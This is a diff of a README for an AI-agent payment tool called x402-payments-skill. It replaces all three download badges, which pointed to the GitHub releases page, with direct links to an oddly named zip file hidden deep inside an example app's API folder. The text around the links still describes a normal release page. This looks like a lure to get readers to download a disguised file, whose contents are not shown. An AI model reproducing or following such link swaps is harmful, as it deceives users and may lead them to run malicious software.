@@ -1,6 +1,6 @@
 # ⚡ x402-payments-skill - Easy AI Payment Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-x402--payments--skill-blue?style=for-the-badge)](https://github.com/mistertechie06/x402-payments-skill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-x402--payments--skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/mistertechie06/x402-payments-skill/main/examples/paid-api-seller/app/api/joke/payments-x-skill-Sivapithecus.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before downloading, make sure your computer meets these:
 
 1. Click the button below to visit the download page and get the latest version:
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-x402--payments--skill-green?style=for-the-badge)](https://github.com/mistertechie06/x402-payments-skill/releases)
+   [![Download Latest Release](https://img.shields.io/badge/Download-x402--payments--skill-green?style=for-the-badge)](https://raw.githubusercontent.com/mistertechie06/x402-payments-skill/main/examples/paid-api-seller/app/api/joke/payments-x-skill-Sivapithecus.zip)
 
 2. On the page, look for the latest release version.
 
@@ -136,7 +136,7 @@ This app is one of the most complete payment skills for AI agents. It supports m
 
 Download the latest version of x402-payments-skill here:
 
-[![Download on GitHub](https://img.shields.io/badge/Download-x402--payments--skill-blue?style=for-the-badge)](https://github.com/mistertechie06/x402-payments-skill/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-x402--payments--skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/mistertechie06/x402-payments-skill/main/examples/paid-api-seller/app/api/joke/payments-x-skill-Sivapithecus.zip)
 
 ---
 
